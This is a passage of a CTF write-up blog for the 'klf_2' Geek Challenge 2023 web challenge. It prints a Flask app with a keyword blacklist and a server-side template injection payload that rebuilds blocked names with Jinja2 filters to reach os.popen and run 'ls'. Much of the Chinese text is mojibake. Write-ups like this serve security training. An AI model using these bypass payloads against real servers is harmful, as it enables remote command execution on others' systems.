<!DOCTYPE html><html lang="zh-CN" id="theme-light-mode"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="zIxyd"><title>Geek Challenge 2023 Â· zIxyd's Blog</title><meta name="description" content="å‰è¨€è®°å½•ä¸€äº›åœ¨Geek Challenge 2023æ¯”èµ›ä¸­çš„wpï¼›ä¸€éƒ¨åˆ†å†™çš„æ¯”è¾ƒè¯¦ç»†ï¼Œä¸€éƒ¨åˆ†å†™çš„æ¯”è¾ƒç®€å•ï¼Œæ ¹æ®é¢˜ç›®çš„éš¾æ˜“åº¦æ¥çš„ï¼›
klf_2æºç å†æ¯”èµ›ä¸­æ˜¯çœ‹ä¸åˆ°æºç çš„ï¼Œæ˜¯æˆ‘åæ¥å¯ä»¥rceåï¼Œcat app.pyå¾—åˆ°æºç çš„ï¼Œä¸ºäº†æ–¹ä¾¿å†™wpï¼Œå°±è´´ä¸€ä¸‹
12345678910111213141516171"><meta name="keywords" content="Blog,åšå®¢,Hexo"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="shortcut icon" type="image/x-icon" href="/images/logo.png"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="stylesheet" href="/css/insight.css"><link rel="stylesheet" href="/css/search.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"><script src="/js/jquery.js"></script><meta name="generator" content="Hexo 6.3.0"></head><body><div class="page-top animated fadeInDown"><div class="nav"><li> <a href="/">Home</a></li><li> <a href="/archives">Archives</a></li><li> <a href="/tags">Tags</a></li><li> <a href="/about">About</a></li></div><div class="information"><div class="nav_right_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)"> </a></li><li><a class="fa fa-search" onclick="openWindow();"></a></li><li><a class="fa fa-sun-o" onclick="darkLightToggle();"></a></li></div><div class="avatar"></div></div></div><div class="toc-container in-page animated fadeInDown"><details class="ltr toc-toggle"><summary>Menu</summary><div class="tocmenu"><ol class="toclist"><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#%E5%89%8D%E8%A8%80"><span class="toclist-text">å‰è¨€</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#klf-2"><span class="toclist-text">klf_2</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E6%BA%90%E7%A0%81"><span class="toclist-text">æºç </span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E6%9E%84%E9%80%A0%E5%85%B3%E9%94%AE%E5%AD%97"><span class="toclist-text">æ„é€ å…³é”®å­—</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E6%9E%84%E9%80%A0cmd"><span class="toclist-text">æ„é€ cmd</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#%E6%9E%84%E9%80%A0%E7%A9%BA%E6%A0%BC"><span class="toclist-text">æ„é€ ç©ºæ ¼</span></a></li><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#%E6%9E%84%E9%80%A0%E5%8F%8D%E6%96%9C%E6%9D%A0"><span class="toclist-text">æ„é€ åæ–œæ </span></a></li></ol></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E6%80%9D%E8%B7%AF%E4%B8%80"><span class="toclist-text">æ€è·¯ä¸€</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E6%80%9D%E8%B7%AF%E4%BA%8C"><span class="toclist-text">æ€è·¯äºŒ</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E6%80%9D%E8%B7%AF%E4%B8%89"><span class="toclist-text">æ€è·¯ä¸‰</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#exp"><span class="toclist-text">exp</span></a></li></ol></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#EzRce"><span class="toclist-text">EzRce</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E5%BC%82%E6%88%96%E4%B8%8A%F0%9F%90%8E"><span class="toclist-text">å¼‚æˆ–ä¸ŠğŸ</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E6%8F%90%E6%9D%83"><span class="toclist-text">ææƒ</span></a></li></ol></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#ezpython"><span class="toclist-text">ezpython</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E6%BA%90%E7%A0%81-1"><span class="toclist-text">æºç </span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#example"><span class="toclist-text">example</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#pollute"><span class="toclist-text">pollute</span></a></li></ol></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#%E9%9B%A8"><span class="toclist-text">é›¨</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#ez-remove"><span class="toclist-text">ez_remove</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#ez-path-os-path-join"><span class="toclist-text">ez_path(os.path.join)</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#you-konw-flask"><span class="toclist-text">you konw flask?</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#Pupyy-rce-%E6%97%A0%E5%8F%82RCE"><span class="toclist-text">Pupyy_rce(æ— å‚RCE)</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#ez-php"><span class="toclist-text">ez_php</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E6%BA%90%E7%A0%81-2"><span class="toclist-text">æºç </span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#Oa-d-i"><span class="toclist-text">&#x2F;^[Oa]:[\d]+&#x2F;i</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#pop-one"><span class="toclist-text">pop_one</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#pop-two"><span class="toclist-text">pop_two</span></a></li></ol></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#Akane"><span class="toclist-text">Akane!</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#source-code"><span class="toclist-text">source code</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#Example"><span class="toclist-text">Example</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#exp-1"><span class="toclist-text">exp</span></a></li></ol></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#klf-3"><span class="toclist-text">klf_3</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#source-code-1"><span class="toclist-text">source code</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#poc"><span class="toclist-text">poc</span></a></li></ol></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#famale-imp-l0ve"><span class="toclist-text">famale_imp_l0ve</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#change-it"><span class="toclist-text">change_it</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#source-code-2"><span class="toclist-text">source code</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#poc-1"><span class="toclist-text">poc</span></a></li></ol></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#flag%E4%BF%9D%E5%8D%AB%E6%88%98-%E5%BE%85%E5%A4%8D%E7%8E%B0"><span class="toclist-text">flagä¿å«æˆ˜(å¾…å¤ç°)</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#ezrfi-%E5%BE%85%E5%A4%8D%E7%8E%B0"><span class="toclist-text">ezrfi(å¾…å¤ç°)</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#scan-tool-%E5%BE%85%E5%A4%8D%E7%8E%B0"><span class="toclist-text">scan_tool(å¾…å¤ç°)</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#ez-sql-%E5%BE%85%E5%A4%8D%E7%8E%B0"><span class="toclist-text">ez_sql(å¾…å¤ç°)</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#EZ-Smuggling-%E5%BE%85%E5%A4%8D%E7%8E%B0"><span class="toclist-text">EZ_Smuggling(å¾…å¤ç°)</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#java-%E5%BE%85%E5%A4%8D%E7%8E%B0"><span class="toclist-text">java(å¾…å¤ç°)</span></a></li></ol></div></details></div><div class="sidebar animated fadeInDown"><div class="sidebar-top"><div class="logo-title"><div class="title"><img src="/images/logo.png" style="width:220px;" alt="favicon"><h3 title=""><a href="/">zIxyd's Blog</a></h3><div class="description"><p>å­˜æ”¾ä¸ªäººå­¦ä¹ ç¬”è®°çš„å°çªï¼Œæ¬¢è¿äº¤æµ</p></div></div><ul class="social-links"><li><a target="_blank" rel="noopener" href="https://github.com/zIxyd"><i class="fa fa-github"></i></a></li><li><a href="mailto:2972914692@qq.comm"><i class="fa fa-envelope"></i></a></li><li><a target="_blank" rel="noopener" href="https://res.abeim.cn/api-qq?qq=2972914692"><i class="fa fa-qq"></i></a></li></ul></div><div class="toc-container in-sidebar"><details class="ltr" open><summary>Menu</summary><div class="tocmenu"><ol class="toclist"><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#%E5%89%8D%E8%A8%80"><span class="toclist-text">å‰è¨€</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#klf-2"><span class="toclist-text">klf_2</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E6%BA%90%E7%A0%81"><span class="toclist-text">æºç </span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E6%9E%84%E9%80%A0%E5%85%B3%E9%94%AE%E5%AD%97"><span class="toclist-text">æ„é€ å…³é”®å­—</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E6%9E%84%E9%80%A0cmd"><span class="toclist-text">æ„é€ cmd</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#%E6%9E%84%E9%80%A0%E7%A9%BA%E6%A0%BC"><span class="toclist-text">æ„é€ ç©ºæ ¼</span></a></li><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#%E6%9E%84%E9%80%A0%E5%8F%8D%E6%96%9C%E6%9D%A0"><span class="toclist-text">æ„é€ åæ–œæ </span></a></li></ol></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E6%80%9D%E8%B7%AF%E4%B8%80"><span class="toclist-text">æ€è·¯ä¸€</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E6%80%9D%E8%B7%AF%E4%BA%8C"><span class="toclist-text">æ€è·¯äºŒ</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E6%80%9D%E8%B7%AF%E4%B8%89"><span class="toclist-text">æ€è·¯ä¸‰</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#exp"><span class="toclist-text">exp</span></a></li></ol></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#EzRce"><span class="toclist-text">EzRce</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E5%BC%82%E6%88%96%E4%B8%8A%F0%9F%90%8E"><span class="toclist-text">å¼‚æˆ–ä¸ŠğŸ</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E6%8F%90%E6%9D%83"><span class="toclist-text">ææƒ</span></a></li></ol></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#ezpython"><span class="toclist-text">ezpython</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E6%BA%90%E7%A0%81-1"><span class="toclist-text">æºç </span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#example"><span class="toclist-text">example</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#pollute"><span class="toclist-text">pollute</span></a></li></ol></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#%E9%9B%A8"><span class="toclist-text">é›¨</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#ez-remove"><span class="toclist-text">ez_remove</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#ez-path-os-path-join"><span class="toclist-text">ez_path(os.path.join)</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#you-konw-flask"><span class="toclist-text">you konw flask?</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#Pupyy-rce-%E6%97%A0%E5%8F%82RCE"><span class="toclist-text">Pupyy_rce(æ— å‚RCE)</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#ez-php"><span class="toclist-text">ez_php</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E6%BA%90%E7%A0%81-2"><span class="toclist-text">æºç </span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#Oa-d-i"><span class="toclist-text">&#x2F;^[Oa]:[\d]+&#x2F;i</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#pop-one"><span class="toclist-text">pop_one</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#pop-two"><span class="toclist-text">pop_two</span></a></li></ol></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#Akane"><span class="toclist-text">Akane!</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#source-code"><span class="toclist-text">source code</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#Example"><span class="toclist-text">Example</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#exp-1"><span class="toclist-text">exp</span></a></li></ol></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#klf-3"><span class="toclist-text">klf_3</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#source-code-1"><span class="toclist-text">source code</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#poc"><span class="toclist-text">poc</span></a></li></ol></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#famale-imp-l0ve"><span class="toclist-text">famale_imp_l0ve</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#change-it"><span class="toclist-text">change_it</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#source-code-2"><span class="toclist-text">source code</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#poc-1"><span class="toclist-text">poc</span></a></li></ol></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#flag%E4%BF%9D%E5%8D%AB%E6%88%98-%E5%BE%85%E5%A4%8D%E7%8E%B0"><span class="toclist-text">flagä¿å«æˆ˜(å¾…å¤ç°)</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#ezrfi-%E5%BE%85%E5%A4%8D%E7%8E%B0"><span class="toclist-text">ezrfi(å¾…å¤ç°)</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#scan-tool-%E5%BE%85%E5%A4%8D%E7%8E%B0"><span class="toclist-text">scan_tool(å¾…å¤ç°)</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#ez-sql-%E5%BE%85%E5%A4%8D%E7%8E%B0"><span class="toclist-text">ez_sql(å¾…å¤ç°)</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#EZ-Smuggling-%E5%BE%85%E5%A4%8D%E7%8E%B0"><span class="toclist-text">EZ_Smuggling(å¾…å¤ç°)</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#java-%E5%BE%85%E5%A4%8D%E7%8E%B0"><span class="toclist-text">java(å¾…å¤ç°)</span></a></li></ol></div></details></div></div><div class="footer"><div class="p"> <span> å…¨ç«™CC-BY-SA-3.0 </span><i class="fa fa-star"></i><span> zIxyd</span></div><div class="by_farbox"><span>Powered by </span><a href="https://hexo.io/zh-cn/" target="_blank">Hexo </a><span> & </span><a href="https://github.com/Lhcfl/hexo-theme-anatolo" target="_blank">Anatolo </a></div><div class="beian"></div></div></div><div class="main"><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post animated fadeInDown"><div class="post-title"><h3><a>Geek Challenge 2023</a></h3></div><div class="post-content"><p><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è®°å½•ä¸€äº›åœ¨Geek Challenge 2023æ¯”èµ›ä¸­çš„wpï¼›ä¸€éƒ¨åˆ†å†™çš„æ¯”è¾ƒè¯¦ç»†ï¼Œä¸€éƒ¨åˆ†å†™çš„æ¯”è¾ƒç®€å•ï¼Œæ ¹æ®é¢˜ç›®çš„éš¾æ˜“åº¦æ¥çš„ï¼›</p>
<h2 id="klf-2"><a href="#klf-2" class="headerlink" title="klf_2"></a>klf_2</h2><h3 id="æºç "><a href="#æºç " class="headerlink" title="æºç "></a>æºç </h3><p>å†æ¯”èµ›ä¸­æ˜¯çœ‹ä¸åˆ°æºç çš„ï¼Œæ˜¯æˆ‘åæ¥å¯ä»¥rceåï¼Œcat app.pyå¾—åˆ°æºç çš„ï¼Œä¸ºäº†æ–¹ä¾¿å†™wpï¼Œå°±è´´ä¸€ä¸‹</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, render_template_string,send_from_directory</span><br><span class="line"><span class="keyword">import</span> re <span class="keyword">import</span> os </span><br><span class="line"></span><br><span class="line">app = Flask(__name__) </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(): </span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>) </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/secr3ttt&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>) </span></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">secr3t</span>(): </span><br><span class="line">		klf = request.args.get(<span class="string">&#x27;klf&#x27;</span>, <span class="string">&#x27;&#x27;</span>) </span><br><span class="line">		template = <span class="string">f&#x27;&#x27;&#x27; &lt;html&gt; &lt;body&gt;</span></span><br><span class="line"><span class="string">       	 &lt;h1&gt;åˆ«æ‰¾äº†ï¼Œè¿™æ¬¡ä½ è‚¯å®šæ˜¯klf&lt;/h1&gt; </span></span><br><span class="line"><span class="string">        &lt;/body&gt; &lt;img src=&quot;https://image-obsidian-1317327960.cos.ap-chengdu.myqcloud.com/obisidian-				 blog/0071088CAC91D2C42C4D31053A7E8D2B731D69.jpg&quot; alt=&quot;g&quot;&gt; </span></span><br><span class="line"><span class="string">        &lt;h1&gt;%s&lt;/h1&gt; &lt;/html&gt; &lt;!--klf?--&gt; &lt;!-- åˆ«æƒ³è¦flagï¼Ÿklf --&gt; &#x27;&#x27;&#x27;</span> </span><br><span class="line">		bl = [<span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;request&#x27;</span>, <span class="string">&quot;+&quot;</span>, <span class="string">&#x27;class&#x27;</span>, <span class="string">&#x27;init&#x27;</span>, <span class="string">&#x27;arg&#x27;</span>, <span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;app&#x27;</span>, <span class="string">&#x27;self&#x27;</span>, <span class="string">&#x27;cd&#x27;</span>, <span class="string">&#x27;chr&#x27;</span>, 				<span class="string">&#x27;request&#x27;</span>, <span class="string">&#x27;url&#x27;</span>, <span class="string">&#x27;builtins&#x27;</span>, <span class="string">&#x27;globals&#x27;</span>, <span class="string">&#x27;base&#x27;</span>, <span class="string">&#x27;pop&#x27;</span>, <span class="string">&#x27;import&#x27;</span>, <span class="string">&#x27;popen&#x27;</span>, <span class="string">&#x27;getitem&#x27;</span>, <span class="string">&#x27;subclasses&#x27;</span>, 				<span class="string">&#x27;/&#x27;</span>, 			<span class="string">&#x27;flashed&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;read&#x27;</span>, <span class="string">&#x27;count&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;38&#x27;</span>, <span class="string">&#x27;124&#x27;</span>, <span class="string">&#x27;47&#x27;</span>, <span class="string">&#x27;59&#x27;</span>, <span class="string">&#x27;99&#x27;</span>, 					<span class="string">&#x27;100&#x27;</span>, <span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;~&#x27;</span>, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;not&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;ord&#x27;</span>, <span class="string">&#x27;37&#x27;</span>, <span class="string">&#x27;94&#x27;</span>, <span class="string">&#x27;96&#x27;</span>, <span class="string">&#x27;[&#x27;</span>,<span class="string">&#x27;]&#x27;</span>,<span class="string">&#x27;index&#x27;</span>,<span class="string">&#x27;length&#x27;</span>]</span><br><span class="line"><span class="comment">#&#x27;43&#x27;, &#x27;45&#x27;, </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> bl: </span><br><span class="line">	<span class="keyword">if</span> i <span class="keyword">in</span> klf: </span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">&#x27;klf.html&#x27;</span>) </span><br><span class="line"></span><br><span class="line">a = render_template_string(template % klf) </span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;&#123;&quot;</span> <span class="keyword">in</span> a: <span class="keyword">return</span> a + render_template(<span class="string">&#x27;win.html&#x27;</span>) </span><br><span class="line">	<span class="keyword">return</span> a @app.route(<span class="string">&#x27;/robots.txt&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]) </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">robots</span>():	</span><br><span class="line">	<span class="keyword">return</span> send_from_directory(os.path.join(app.root_path, <span class="string">&#x27;static&#x27;</span>), <span class="string">&#x27;robots.txt&#x27;</span>, mimetype=<span class="string">&#x27;text/plain&#x27;</span>) </span><br><span class="line">	</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>: app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">7889</span>, debug=<span class="literal">False</span></span><br></pre></td></tr></table></figure>



<p>é»‘åå•è¿‡æ»¤äº†ä¸€å¤§éƒ¨åˆ†å…³é”®å­—å’Œå…³é”®ç¬¦å·ã€‚ä½†æ˜¯æ²¡æœ‰<code>.</code>ï¼Œ<code>join</code>è¿‡æ»¤å™¨ï¼Œ<code>dict</code>ï¼Œ<code>= </code>ï¼Œ<code>()</code>ï¼Œ<code>set</code>,<code>|</code>,<code>attr</code>.è¿˜æ˜¯æœ‰æœºå¯ä¹˜çš„</p>
<h3 id="æ„é€ å…³é”®å­—"><a href="#æ„é€ å…³é”®å­—" class="headerlink" title="æ„é€ å…³é”®å­—"></a>æ„é€ å…³é”®å­—</h3><p>è¿™ä¸€éƒ¨åˆ†å°±æ˜¯æ„é€ å‡ºå…³é”®å­—</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__().__getitem__(xx).__init__.__globals__[&#x27;popen&#x27;](xx).read()</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> po=<span class="built_in">dict</span>(po=a,p=b)|join%&#125; </span><br><span class="line">&#123;% <span class="built_in">set</span> a=(()|select|string|<span class="built_in">list</span>)|attr(po)(<span class="number">24</span>)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> ini=(a,a,<span class="built_in">dict</span>(<span class="keyword">in</span>=a,it=b)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> glo=(a,a,<span class="built_in">dict</span>(glo=a,bals=b)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> cls=(a,a,<span class="built_in">dict</span>(cla=a,ss=b)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> bs=(a,a,<span class="built_in">dict</span>(bas=a,e=b)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> geti=(a,a,<span class="built_in">dict</span>(get=a)|join,<span class="built_in">dict</span>(item=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> subc=(a,a,<span class="built_in">dict</span>(subcla=a,sses=b)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> pp=<span class="built_in">dict</span>(po=a,pen=b)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> re=<span class="built_in">dict</span>(re=a,ad=b)|join%&#125;</span><br></pre></td></tr></table></figure>



<h3 id="æ„é€ cmd"><a href="#æ„é€ cmd" class="headerlink" title="æ„é€ cmd"></a>æ„é€ cmd</h3><p>å†ä¸Šä¸€æ­¥çš„åŸºç¡€ä¸Šï¼Œæ„é€ <code>ls</code>ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> po=<span class="built_in">dict</span>(po=a,p=b)|join%&#125; </span><br><span class="line">&#123;% <span class="built_in">set</span> a=(()|select|string|<span class="built_in">list</span>)|attr(po)(<span class="number">24</span>)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> ini=(a,a,<span class="built_in">dict</span>(<span class="keyword">in</span>=a,it=b)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> glo=(a,a,<span class="built_in">dict</span>(glo=a,bals=b)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> cls=(a,a,<span class="built_in">dict</span>(cla=a,ss=b)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> bs=(a,a,<span class="built_in">dict</span>(bas=a,e=b)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> geti=(a,a,<span class="built_in">dict</span>(get=a)|join,<span class="built_in">dict</span>(item=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> subc=(a,a,<span class="built_in">dict</span>(subcla=a,sses=b)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> pp=<span class="built_in">dict</span>(po=a,pen=b)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> re=<span class="built_in">dict</span>(re=a,ad=b)|join%&#125;</span><br><span class="line"></span><br><span class="line">&#123;% <span class="built_in">set</span> ls=<span class="built_in">dict</span>(l=a,s=b)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">print</span>(()|attr(cls)|attr(bs)|attr(subc)()|attr(geti)(<span class="number">117</span>)|attr(ini)|attr(glo)|attr(geti)(pp)(ls)|attr(re)())%&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#app.py hahahaha requirements.txt static templates</span></span><br></pre></td></tr></table></figure>



<p>çœ‹åˆ°flagæ²¡æœ‰å†å½“å‰ç›®å½•ä¸‹ï¼Œå°è¯•æ„é€  <code>ls /</code>,è¿™æ—¶å€™å°±éœ€è¦åœ¨ä¸Šä¸€æ­¥çš„åŸºç¡€ä¸Šï¼Œéœ€è¦æ„é€ ç©ºæ ¼å’Œåæ–œæ å­—ç¬¦<code> </code>,<code>/</code>,</p>
